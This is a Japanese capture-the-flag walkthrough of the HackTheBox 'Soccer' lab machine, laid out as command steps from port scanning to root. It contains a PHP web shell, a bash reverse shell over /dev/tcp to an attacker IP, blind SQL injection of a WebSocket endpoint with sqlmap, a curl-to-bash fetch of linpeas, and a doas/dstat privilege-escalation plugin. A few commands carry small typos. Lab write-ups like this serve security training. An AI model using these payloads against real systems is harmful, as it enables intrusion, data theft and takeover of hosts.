# HackTheBox: Soccer Walkthrough

## 1. ポートスキャンと初期調査

```bash
sudo nmap -sC -sV -oA portscan soccer.htb
less portscan
```

## 2. ホスト設定

```bash
sudo nano /etc/hosts
# 追加:
<IP address> soccer.htb
```

## 3. Web探索

- ブラウザで `http://soccer.htb:9091` を開く
- ディレクトリ探索：

```bash
gobuster dir -u http://soccer.htb/ -w /usr/share/SecLists/Discovery/Web-Content/raft-small-words.txt
```

- `/tiny/` にログインページ発見
- "h3k Tiny File Manager" を検索してGitHub情報を確認

## 4. ログインとファイルアップロード

- 試行ログイン：`admin / admin@123`
- アップロードセクションを探す
- Webシェル作成：

```php
<?php system($_REQUEST['cmd']); ?>
```

```bash
nano shell.php
# アップロード: shell.php
# アクセス: http://soccer.htb/tiny/uploads/shell.php?cmd=whoami
```

## 5. リバースシェル取得

- Burpでインターセプト → `cmd=bash -sC 'bash -i >& /dev/tcp/<host IP address>/9001 0>&1'`
- Ctrl+UでURLエンコード
- リスナー起動：

```bash
nc -lnvp 9001
```

- Burp経由で送信 → シェル取得

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg
export TERM=xterm
clear
```

## 6. サーバー調査

```bash
ss -lntp
ps -ef --forest
cat /etc/fstab
ls /proc
cd /etc/nginx/sites-enabled/
cat default
cat soc-play.htb
```

## 7. 新しいホスト追加と探索

```bash
sudo nano /etc/hosts
# 追加:
<IP address> soc-player.soccer.htb
```

- ブラウザで `soc-player.soccer.htb` にアクセス
- サインアップページへ → `root@daijiro.rocks / password`
- SQL Injection 試行：`69330 or 1=1-- -`

## 8. WebSocket SQL Injection

- BurpでWebSocketメッセージ取得 → `injection.req` に保存

```bash
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --technique=B --risk 3 --level 5 --batch --dbs --threads 10
wscat -c soc-player.soccer.htb:9091
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --technique=B --risk 3 --level 5 --batch --threads 10 -D soccer_db --dump
```

## 9. プレイヤーとしてログイン

```bash
ssh player@soccer.htb
# パスワード: PlayerOftheMatch2022
```

## 10. ローカル探索

```bash
cat /etc/passwd | grep sh$
ls -la
ps -ef --forest
find / -user player 2>/dev/null | grep -v '^/proc\|^/run\|^/sys'
groups
find / -user group player 2>/dev/null | grep -v '^/proc\|^/run\|^/sys'
```

## 11. dstat関連の調査

```bash
cat /usr/local/share/dstat
ls -la /usr/local/share/dstat
find / -name dstat 2>/dev/null
sudo -l
```

- SQLMapの出力確認：

```bash
cd ~/.config/.local/share/sqlmap/output/soc-player.soccer.htb/dump/succer_db
cat accounts.csv
```

- パスワード取得 → 使用

```bash
stat /usr/bin/dstat
```

## 12. 権限昇格調査

- linpeas使用：

```bash
python3 -m http.server
curl <host IP address>:8000/linpeas.sh | bash
```

- SUID探索：

```bash
find / -perm -4000 -ls 2>/dev/null
find /etc | grep does
find / 2>/dev/null | grep does
cat /usr/local/etc/doas.conf
```

## 13. Exploit作成と実行

```bash
vi dstat_pleasesubscribe.py
# 内容:
import os
os.execv("/bin/sh", ["sh"])

doas /usr/bin/dstat --pleasesubscribe
```

## 14. Root取得

```bash
id
cd /root
ls
cat root.txt
```

---
